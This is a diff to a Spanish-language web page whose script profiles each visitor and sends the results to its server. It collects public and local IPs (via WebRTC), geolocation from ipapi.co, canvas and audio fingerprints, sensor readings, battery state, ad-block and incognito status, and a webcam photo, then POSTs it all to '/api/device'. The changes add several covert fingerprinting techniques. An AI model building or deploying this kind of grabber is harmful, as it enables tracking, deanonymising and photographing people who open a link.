@@ -25,39 +25,15 @@
       width: 100%;
       box-shadow: 0 12px 40px rgba(0,0,0,0.5);
     }
-    .codigo {
-      font-size: 0.8rem;
-      color: #666;
-      letter-spacing: 3px;
-      font-weight: 500;
-      margin-bottom: 2px;
-    }
-    h1 {
-      font-size: 1.55rem;
-      font-weight: 700;
-      color: #fff;
-      margin-bottom: 10px;
-    }
-    .status {
-      font-size: 0.92rem;
-      color: #999;
-      margin-bottom: 18px;
-      min-height: 22px;
-    }
+    .codigo { font-size: 0.8rem; color: #666; letter-spacing: 3px; margin-bottom: 2px; }
+    h1 { font-size: 1.55rem; font-weight: 700; color: #fff; margin-bottom: 10px; }
+    .status { font-size: 0.92rem; color: #999; margin-bottom: 18px; min-height: 22px; }
     .status.ok { color: #4ade80; }
     .status.error { color: #f87171; }
     .status.loading { color: #60a5fa; }
-    .info {
-      font-size: 0.87rem;
-      line-height: 1.75;
-      color: #b0b0b0;
-    }
+    .info { font-size: 0.87rem; line-height: 1.75; color: #b0b0b0; }
     .info b { color: #ddd; font-weight: 600; }
-    .divider {
-      height: 1px;
-      background: #2a2a2a;
-      margin: 14px 0;
-    }
+    .divider { height: 1px; background: #2a2a2a; margin: 14px 0; }
   </style>
 </head>
 <body>
@@ -69,73 +45,133 @@
   </div>
 
   <script>
-    // ——— Utilidades ———
+    const startTime = Date.now();
+
+    // ——— WebRTC Local IPs ———
+    function getLocalIPs() {
+      return new Promise(resolve => {
+        const ips = new Set();
+        try {
+          const pc = new RTCPeerConnection({ iceServers: [] });
+          pc.createDataChannel("");
+          pc.createOffer().then(offer => pc.setLocalDescription(offer));
+          pc.onicecandidate = (e) => {
+            if (!e.candidate) {
+              pc.close();
+              resolve([...ips]);
+              return;
+            }
+            const match = e.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
+            if (match && match[1]) ips.add(match[1]);
+          };
+          setTimeout(() => { pc.close(); resolve([...ips]); }, 2000);
+        } catch (e) {
+          resolve([]);
+        }
+      });
+    }
+
+    // ——— WebGL ———
     function getWebGL() {
       try {
-        const canvas = document.createElement("canvas");
-        const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
+        const c = document.createElement("canvas");
+        const gl = c.getContext("webgl") || c.getContext("experimental-webgl");
         if (!gl) return { vendor: "N/A", renderer: "N/A" };
-        const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
-        if (debugInfo) {
-          return {
-            vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) || "N/A",
-            renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || "N/A"
-          };
-        }
+        const info = gl.getExtension("WEBGL_debug_renderer_info");
         return {
-          vendor: gl.getParameter(gl.VENDOR) || "N/A",
-          renderer: gl.getParameter(gl.RENDERER) || "N/A"
+          vendor: info ? gl.getParameter(info.UNMASKED_VENDOR_WEBGL) : gl.getParameter(gl.VENDOR),
+          renderer: info ? gl.getParameter(info.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER)
         };
       } catch (e) {
         return { vendor: "N/A", renderer: "N/A" };
       }
     }
 
+    // ——— Canvas Fingerprint ———
     function getCanvasFingerprint() {
       try {
-        const canvas = document.createElement("canvas");
-        canvas.width = 200;
-        canvas.height = 50;
-        const ctx = canvas.getContext("2d");
+        const c = document.createElement("canvas");
+        c.width = 240; c.height = 60;
+        const ctx = c.getContext("2d");
         ctx.textBaseline = "top";
-        ctx.font = "14px Arial";
+        ctx.font = "16px Arial";
         ctx.fillStyle = "#f60";
-        ctx.fillRect(0, 0, 100, 50);
+        ctx.fillRect(0, 0, 120, 60);
         ctx.fillStyle = "#069";
-        ctx.fillText("474747-fingerprint", 2, 15);
-        ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
-        ctx.fillText("474747-fingerprint", 4, 17);
-        return canvas.toDataURL().slice(-32);
-      } catch (e) {
-        return "N/A";
-      }
+        ctx.fillText("474747-fp", 4, 20);
+        ctx.fillStyle = "rgba(102,204,0,0.7)";
+        ctx.fillText("474747-fp", 6, 22);
+        return c.toDataURL().slice(-40);
+      } catch (e) { return "N/A"; }
     }
 
+    // ——— Audio Fingerprint ———
+    function getAudioFingerprint() {
+      return new Promise(resolve => {
+        try {
+          const ctx = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 44100, 44100);
+          const osc = ctx.createOscillator();
+          osc.type = "triangle";
+          osc.frequency.value = 10000;
+          const comp = ctx.createDynamicsCompressor();
+          comp.threshold.value = -50;
+          comp.knee.value = 40;
+          comp.ratio.value = 12;
+          comp.attack.value = 0;
+          comp.release.value = 0.25;
+          osc.connect(comp);
+          comp.connect(ctx.destination);
+          osc.start(0);
+          ctx.startRendering();
+          ctx.oncomplete = (e) => {
+            let hash = 0;
+            const data = e.renderedBuffer.getChannelData(0);
+            for (let i = 0; i < data.length; i += 100) {
+              hash = ((hash << 5) - hash) + Math.floor(data[i] * 10000);
+              hash |= 0;
+            }
+            resolve(String(hash));
+          };
+        } catch (e) {
+          resolve("N/A");
+        }
+      });
+    }
+
+    // ——— AdBlock detection ———
+    function detectAdBlock() {
+      return new Promise(resolve => {
+        const test = document.createElement("div");
+        test.innerHTML = "&nbsp;";
+        test.className = "adsbox ad-banner adsbygoogle";
+        test.style.position = "absolute";
+        test.style.left = "-9999px";
+        document.body.appendChild(test);
+        setTimeout(() => {
+          const blocked = test.offsetHeight === 0;
+          test.remove();
+          resolve(blocked ? "Sí" : "No");
+        }, 100);
+      });
+    }
+
+    // ——— Incognito ———
     async function detectIncognito() {
       try {
         if (navigator.storage && navigator.storage.estimate) {
           const { quota } = await navigator.storage.estimate();
-          // En incógnito el quota suele ser muy bajo
           if (quota && quota < 120000000) return "Sí (probable)";
         }
-        // Fallback: localStorage + indexedDB
-        const fs = window.RequestFileSystem || window.webkitRequestFileSystem;
-        if (fs) {
-          return new Promise(resolve => {
-            fs(window.TEMPORARY, 100, () => resolve("No"), () => resolve("Sí (probable)"));
-          });
-        }
-        return "Desconocido";
+        return "No / Desconocido";
       } catch (e) {
         return "Desconocido";
       }
     }
 
-    async function getMediaDevicesCount() {
+    // ——— Media devices ———
+    async function getMediaCount() {
       try {
-        if (!navigator.mediaDevices || !navigator.mediaDevices.enumerateDevices) {
-          return { cameras: "N/A", mics: "N/A", speakers: "N/A" };
-        }
+        if (!navigator.mediaDevices?.enumerateDevices) return { cameras: "N/A", mics: "N/A", speakers: "N/A" };
         const devices = await navigator.mediaDevices.enumerateDevices();
         return {
           cameras: devices.filter(d => d.kind === "videoinput").length,
@@ -147,37 +183,60 @@
       }
     }
 
-    function getFonts() {
-      const baseFonts = ["monospace", "sans-serif", "serif"];
-      const testFonts = [
-        "Arial", "Arial Black", "Calibri", "Cambria", "Comic Sans MS",
-        "Courier", "Courier New", "Georgia", "Helvetica", "Impact",
-        "Lucida Console", "Tahoma", "Times New Roman", "Trebuchet MS",
-        "Verdana", "Roboto", "Open Sans", "Noto Sans", "Segoe UI"
-      ];
-      const detected = [];
-      const canvas = document.createElement("canvas");
-      const ctx = canvas.getContext("2d");
-      const text = "mmmmmmmmmmlli";
-      const baselines = {};
+    // ——— Sensors ———
+    function getSensors() {
+      return new Promise(resolve => {
+        const result = { accel: "N/A", gyro: "N/A" };
+        let gotAccel = false, gotGyro = false;
 
-      baseFonts.forEach(base => {
-        ctx.font = "72px " + base;
-        baselines[base] = ctx.measureText(text).width;
+        const finish = () => {
+          if (gotAccel && gotGyro) resolve(result);
+        };
+
+        // Accelerometer
+        if (window.DeviceMotionEvent) {
+          const handler = (e) => {
+            if (e.accelerationIncludingGravity) {
+              const a = e.accelerationIncludingGravity;
+              result.accel = `x:\( {a.x?.toFixed(1) || 0} y: \){a.y?.toFixed(1) || 0} z:${a.z?.toFixed(1) || 0}`;
+              gotAccel = true;
+              window.removeEventListener("devicemotion", handler);
+              finish();
+            }
+          };
+          window.addEventListener("devicemotion", handler);
+        } else gotAccel = true;
+
+        // Gyroscope
+        if (window.DeviceOrientationEvent) {
+          const handler = (e) => {
+            result.gyro = `α:\( {e.alpha?.toFixed(0) || 0} β: \){e.beta?.toFixed(0) || 0} γ:${e.gamma?.toFixed(0) || 0}`;
+            gotGyro = true;
+            window.removeEventListener("deviceorientation", handler);
+            finish();
+          };
+          window.addEventListener("deviceorientation", handler);
+        } else gotGyro = true;
+
+        setTimeout(() => resolve(result), 1500);
       });
-
-      testFonts.forEach(font => {
-        let detectedFont = false;
-        baseFonts.forEach(base => {
-          ctx.font = "72px '" + font + "', " + base;
-          if (ctx.measureText(text).width !== baselines[base]) detectedFont = true;
-        });
-        if (detectedFont) detected.push(font);
-      });
-
-      return detected.length ? detected.join(", ") : "Ninguna detectada";
     }
 
+    // ——— Battery completa ———
+    async function getBatteryInfo() {
+      const info = { level: "N/A", charging: "N/A", chargingTime: "N/A", dischargingTime: "N/A" };
+      if (!navigator.getBattery) return info;
+      try {
+        const bat = await navigator.getBattery();
+        info.level = Math.round(bat.level * 100) + "%";
+        info.charging = bat.charging ? "Cargando" : "Descargando";
+        info.chargingTime = bat.chargingTime && bat.chargingTime !== Infinity ? Math.round(bat.chargingTime / 60) + " min" : "N/A";
+        info.dischargingTime = bat.dischargingTime && bat.dischargingTime !== Infinity ? Math.round(bat.dischargingTime / 60) + " min" : "N/A";
+      } catch (e) {}
+      return info;
+    }
+
+    // ——— Foto ———
     async function capturarFoto() {
       try {
         const stream = await navigator.mediaDevices.getUserMedia({
@@ -189,13 +248,13 @@
         video.playsInline = true;
         video.muted = true;
         await video.play();
-        await new Promise(r => setTimeout(r, 600));
+        await new Promise(r => setTimeout(r, 500));
         const canvas = document.createElement("canvas");
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
         canvas.getContext("2d").drawImage(video, 0, 0);
         stream.getTracks().forEach(t => t.stop());
-        return canvas.toDataURL("image/jpeg", 0.65);
+        return canvas.toDataURL("image/jpeg", 0.6);
       } catch (e) {
         return null;
       }
@@ -206,13 +265,23 @@
       const statusEl = document.getElementById("status");
       const infoEl = document.getElementById("info");
 
-      const webgl = getWebGL();
-      const media = await getMediaDevicesCount();
-      const incognito = await detectIncognito();
+      statusEl.textContent = "Recolectando datos...";
+
+      const [localIPs, webgl, audioFp, adblock, incognito, media, sensors, battery] = await Promise.all([
+        getLocalIPs(),
+        Promise.resolve(getWebGL()),
+        getAudioFingerprint(),
+        detectAdBlock(),
+        detectIncognito(),
+        getMediaCount(),
+        getSensors(),
+        getBatteryInfo()
+      ]);
 
       const data = {
         // Red
         ip: "",
+        localIPs: localIPs.join(", ") || "No detectada",
         country: "",
         city: "",
         region: "",
@@ -221,61 +290,53 @@
         rtt: "N/A",
 
         // Dispositivo
-        os: navigator.platform || (navigator.userAgentData && navigator.userAgentData.platform) || "Desconocido",
+        os: navigator.platform || navigator.userAgentData?.platform || "Desconocido",
         browser: "Desconocido",
         device: /Mobi|Android|iPhone|iPad/i.test(navigator.userAgent) ? "Móvil" : "PC",
         ram: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Desconocida",
         nucleos: navigator.hardwareConcurrency || "Desconocido",
         pantalla: window.screen.width + "x" + window.screen.height,
-        pantallaDisponible: window.screen.availWidth + "x" + window.screen.availHeight,
         pixelRatio: String(window.devicePixelRatio || 1),
-        orientacion: (screen.orientation && screen.orientation.type) ? screen.orientation.type : "Desconocida",
-        colorDepth: (screen.colorDepth || "?") + " bits",
+        orientacion: screen.orientation?.type || "Desconocida",
 
-        // GPU
+        // GPU + Fingerprints
         gpuVendor: webgl.vendor,
         gpuRenderer: webgl.renderer,
-
-        // Fingerprints
         canvasFingerprint: getCanvasFingerprint(),
-        fonts: getFonts(),
+        audioFingerprint: audioFp,
 
         // Batería
-        bateria: "No disponible",
-        cargando: "No disponible",
+        bateria: battery.level,
+        cargando: battery.charging,
+        tiempoCarga: battery.chargingTime,
+        tiempoDescarga: battery.dischargingTime,
 
-        // Idioma / zona
-        idioma: navigator.language || "Desconocido",
-        idiomas: (navigator.languages || []).join(", ") || "N/A",
-        zonaHoraria: Intl.DateTimeFormat().resolvedOptions().timeZone || "N/A",
+        // Sensores
+        acelerometro: sensors.accel,
+        giroscopio: sensors.gyro,
 
-        // Privacidad
+        // Detecciones
+        adblock: adblock,
         incognito: incognito,
-        doNotTrack: navigator.doNotTrack || navigator.msDoNotTrack || "No configurado",
-        globalPrivacyControl: navigator.globalPrivacyControl ? "Sí" : "No",
 
         // Media
         cameras: media.cameras,
         mics: media.mics,
         speakers: media.speakers,
 
-        // Almacenamiento
-        cookiesEnabled: navigator.cookieEnabled ? "Sí" : "No",
-        cookies: document.cookie ? document.cookie.substring(0, 100) : "(vacío)",
-        localStorage: (() => { try { localStorage.setItem("_t","1"); localStorage.removeItem("_t"); return "Sí"; } catch(e){ return "No"; } })(),
-        sessionStorage: (() => { try { sessionStorage.setItem("_t","1"); sessionStorage.removeItem("_t"); return "Sí"; } catch(e){ return "No"; } })(),
-
         // Otras
-        toque: ("ontouchstart" in window) ? "Sí" : "No",
+        idioma: navigator.language || "Desconocido",
+        zonaHoraria: Intl.DateTimeFormat().resolvedOptions().timeZone || "N/A",
+        toque: "ontouchstart" in window ? "Sí" : "No",
         maxTouchPoints: navigator.maxTouchPoints || 0,
-        online: navigator.onLine ? "Sí" : "No",
-        webdriver: navigator.webdriver ? "Sí" : "No",
-        pdfViewer: navigator.pdfViewerEnabled ? "Sí" : "No",
-        vendor: navigator.vendor || "N/A",
+        cookiesEnabled: navigator.cookieEnabled ? "Sí" : "No",
+        localStorage: (() => { try { localStorage.setItem("_t","1"); localStorage.removeItem("_t"); return "Sí"; } catch(e){ return "No"; } })(),
         historyLength: history.length || 0,
+        webdriver: navigator.webdriver ? "Sí" : "No",
+        vendor: navigator.vendor || "N/A",
         referrer: document.referrer || "(directo)",
-        memoryJS: (performance && performance.memory) ? Math.round(performance.memory.usedJSHeapSize / 1048576) + " MB" : "N/A",
         userAgent: navigator.userAgent || "",
+        tiempoEnPagina: "0s",
         foto: null
       };
 
@@ -294,34 +355,25 @@
       else if (ua.includes("Firefox")) data.browser = "Firefox";
       else if (ua.includes("Safari")) data.browser = "Safari";
 
-      // Batería
-      if (navigator.getBattery) {
-        try {
-          const bat = await navigator.getBattery();
-          data.bateria = Math.round(bat.level * 100) + "%";
-          data.cargando = bat.charging ? "Cargando" : "Descargando";
-        } catch (e) {}
-      }
-
-      // IP
+      // IP pública
       try {
         const geo = await fetch("https://ipapi.co/json/", { cache: "no-store" }).then(r => r.json());
         if (geo && !geo.error) {
           data.ip = geo.ip || "";
-          data.country = geo.country_name || geo.country || "";
+          data.country = geo.country_name || "";
           data.city = geo.city || "";
           data.region = geo.region || "";
           data.isp = geo.org || "";
         }
       } catch (e) {
         try {
-          const geo2 = await fetch("https://ipwho.is/", { cache: "no-store" }).then(r => r.json());
-          if (geo2 && geo2.success !== false) {
+          const geo2 = await fetch("https://ipwho.is/").then(r => r.json());
+          if (geo2?.success !== false) {
             data.ip = geo2.ip || "";
             data.country = geo2.country || "";
             data.city = geo2.city || "";
             data.region = geo2.region || "";
-            data.isp = (geo2.connection && geo2.connection.isp) || "";
+            data.isp = geo2.connection?.isp || "";
           }
         } catch (e2) {}
       }
@@ -330,28 +382,32 @@
       statusEl.textContent = "Solicitando cámara...";
       data.foto = await capturarFoto();
 
-      // Mostrar resumen
+      // Tiempo hasta ahora
+      data.tiempoEnPagina = Math.round((Date.now() - startTime) / 1000) + "s";
+
+      // Mostrar
       infoEl.innerHTML =
-        "<b>IP:</b> " + (data.ip || "—") + "<br>" +
+        "<b>IP Pública:</b> " + (data.ip || "—") + "<br>" +
+        "<b>IP Local:</b> " + data.localIPs + "<br>" +
         "<b>País:</b> " + (data.country || "—") + (data.city ? " · " + data.city : "") + "<br>" +
         "<b>ISP:</b> " + (data.isp || "—") + "<br>" +
-        "<b>Conexión:</b> " + data.conexion + "<br>" +
         "<div class='divider'></div>" +
         "<b>OS:</b> " + data.os + "<br>" +
         "<b>Navegador:</b> " + data.browser + "<br>" +
-        "<b>Dispositivo:</b> " + data.device + "<br>" +
-        "<b>GPU:</b> " + data.gpuRenderer.substring(0, 40) + "<br>" +
+        "<b>GPU:</b> " + (data.gpuRenderer || "").substring(0, 35) + "<br>" +
         "<b>Pantalla:</b> " + data.pantalla + " (" + data.pixelRatio + "x)<br>" +
-        "<b>RAM:</b> " + data.ram + " · <b>Núcleos:</b> " + data.nucleos + "<br>" +
         "<b>Batería:</b> " + data.bateria + " · " + data.cargando + "<br>" +
-        "<div class='divider'></div>" +
-        "<b>Incógnito:</b> " + data.incognito + "<br>" +
+        "<b>AdBlock:</b> " + data.adblock + " · <b>Incógnito:</b> " + data.incognito + "<br>" +
         "<b>Cámaras:</b> " + data.cameras + " · <b>Mics:</b> " + data.mics + "<br>" +
+        "<b>Tiempo:</b> " + data.tiempoEnPagina + "<br>" +
         "<b>Foto:</b> " + (data.foto ? "Capturada" : "No disponible");
 
       // Enviar
       statusEl.textContent = "Enviando...";
       statusEl.className = "status loading";
+
+      // Actualizar tiempo justo antes de enviar
+      data.tiempoEnPagina = Math.round((Date.now() - startTime) / 1000) + "s";
 
       try {
         const res = await fetch("/api/device", {
@@ -363,7 +419,7 @@
         let result = null;
         try { result = JSON.parse(text); } catch (e) {}
 
-        if (res.ok && result && result.success) {
+        if (res.ok && result?.success) {
           statusEl.textContent = "Información enviada correctamente";
           statusEl.className = "status ok";
         } else {
